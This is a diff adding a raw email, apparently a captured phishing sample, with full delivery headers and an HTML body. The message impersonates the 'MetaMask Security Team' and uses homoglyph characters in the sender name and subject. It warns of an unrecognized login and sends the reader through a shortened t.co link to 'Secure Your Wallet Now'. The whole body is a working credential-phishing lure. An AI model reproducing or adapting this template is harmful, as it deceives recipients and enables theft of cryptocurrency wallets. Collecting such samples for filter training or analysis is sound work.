@@ -1,0 +1,84 @@
+Return-Path: <postmaster@e0b3ddc0e6.nxcli.io>
+Delivered-To: info@vorteksenerji.com
+Received: from fr-life.guzelhosting.com
+	by fr-life.guzelhosting.com with LMTP
+	id oEhMEVfVfWhIGwAAOB6+FQ
+	(envelope-from <postmaster@e0b3ddc0e6.nxcli.io>)
+	for <info@vorteksenerji.com>; Mon, 21 Jul 2025 08:51:19 +0300
+Return-path: <postmaster@e0b3ddc0e6.nxcli.io>
+Envelope-to: info@vorteksenerji.com
+Delivery-date: Mon, 21 Jul 2025 08:51:19 +0300
+Received: from cloudhost-4389502.us-midwest-1.nxcli.net ([209.87.149.97]:45684)
+	by fr-life.guzelhosting.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.98.1)
+	(envelope-from <postmaster@e0b3ddc0e6.nxcli.io>)
+	id 1udjQl-000000002hj-0EIR
+	for info@vorteksenerji.com;
+	Mon, 21 Jul 2025 08:51:19 +0300
+Comment: DomainKeys? See http://domainkeys.sourceforge.net/
+DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;
+  s=default; d=e0b3ddc0e6.nxcli.io;
+  b=cZFlkMen9/3Nv8321Tht1NMxJ/VU2udsfe5VxfdSiEBPB6KbmhmCycxj4tYuF26bF79e6FuDK8zlUJy5m/QRNqF4Eu3e6k0UTR3RhTmcuLC5ak0a+3ju9HN7dmKDCF8N+370DZXr07B0pusiO5hw/cL013J8gNLgsTMEFWxuawVJ/C0CyTKL5iZAVp42/EyvAlPNVQq4urHTEQYOybaPPL3Z8P/Dxjw9CSqizEebEbjJbIiDQZ2v+i8wuyNGXxoFDnjt9+ha3crRh3BtxTfMkiQzf6OA2rehVXuSJXwz2G4wPwE2FK8c86K1mdrWIM/FKXx4vTdC6Q/MxR6f6r2nxg==;
+  h=Received:Date:Message-ID:To:Subject:X-PHP-Originating-Script:From:Reply-To:MIME-Version:Content-Type:X-Mailer:X-Priority:List-Unsubscribe;
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed; d=e0b3ddc0e6.nxcli.io; h=
+	date:message-id:to:subject:from:reply-to:mime-version
+	:content-type:list-unsubscribe; s=default; bh=d9obyMDaf+MRBraytW
+	x7hVHiOgnf9OJburU1cWyZ+Do=; b=knc69U5P8to7Xxrtq4oB8+6x3RRhXYyM0P
+	gnvMuNR9xwGM3iNrMunQIGqO1RDJEO4Ieqe0A+sX41/Q0Lg4VnsB4oSUBLYh0WdY
+	WhrxbHPQCti5Vvf0nYHeFvJMni7/VsvxzRJ5oomR1Eb4N0oTlZy5epEB4xzfoQol
+	GxHrFKygC5kC71Lxgo0PNRQ+w0Ox/itx80B51JGaQrpVEBwbQjPi7ytkgPPK4yJ+
+	PVxOXTrt7te4SoTl8xYhtutWFNI4LSseCLQddTTa1pjae2g6WYtaOQdUgaBzJ/fX
+	Rplvgv9asdxbLW+v/SNH675v5qv38DUsqS+/4yZhnmCMLDgAylQw==
+Received: (qmail 7624 invoked by uid 10138); 21 Jul 2025 05:49:41 +0000
+Date: 21 Jul 2025 05:49:41 +0000
+Message-ID: <20250721054941.7618.qmail@cloudhost-4389502.us-midwest-1.nxcli.net>
+To: info@vorteksenerji.com
+Subject: Wаllet Login Attempt – Vеrification Needed
+X-PHP-Originating-Script: 10138:you.php
+From: "MetаMаsk" <0mjkhhrg@jaz.io>
+Reply-To: 0mjkhhrg@jaz.io
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+X-Mailer: PHP/8.2.20
+X-Priority: 3
+List-Unsubscribe: <mailto:unsubscribe@0mjkhhrg@jaz.io>
+
+
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8" />
+  <title>Account Access Alert</title>
+</head>
+<body style="margin:0; padding:20px; font-family:Arial, sans-serif; background:#f9fafb; color:#222222;">
+  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="max-width:540px; margin: auto; background:#ffffff; border:1px solid #ddd; border-radius:8px;">
+    <tr>
+      <td style="padding: 28px; text-align:center;">
+        <span style="font-size:32px; display:block; line-height:1;">&#129418;</span>
+        <h1 style="color:#f6851b; font-weight:600; margin:16px 0 24px; font-size:22px;">Account Access Alert</h1>
+        <p style="font-size:16px; line-height:1.5; margin:0 0 22px;">
+          We’ve noticed a login from a device or location we don’t recognize. For your security, please review this activity.
+        </p>
+
+        <table role="presentation" cellpadding="0" cellspacing="0" style="margin: 24px auto 16px;">
+          <tr>
+            <td align="center" bgcolor="#f6851b" style="border-radius:6px;">
+              <a href="https://t.co/kznMmVK9zz?id=4661042565767207501-5194" target="_blank" rel="noopener noreferrer" style="font-size:16px; color:#fff; text-decoration:none; padding: 14px 40px; display:inline-block; font-weight:700; font-family:Arial, sans-serif; letter-spacing: 0.03em; user-select:none;">
+                &#8203;Secure Your Wallet Now&#8203;
+              </a>
+            </td>
+          </tr>
+        </table>
+
+        <p style="font-size:13px; color:#888; margin-top:20px; font-style:italic;">
+          If this was you, you don’t need to do anything further. Thank you for helping us keep your account safe.
+        </p>
+        <p style="font-size:12px; color:#bbb; margin-top:40px; user-select:none;">
+          — MetaMask Security Team
+        </p>
+      </td>
+    </tr>
+  </table>
+</body>
+</html>
+
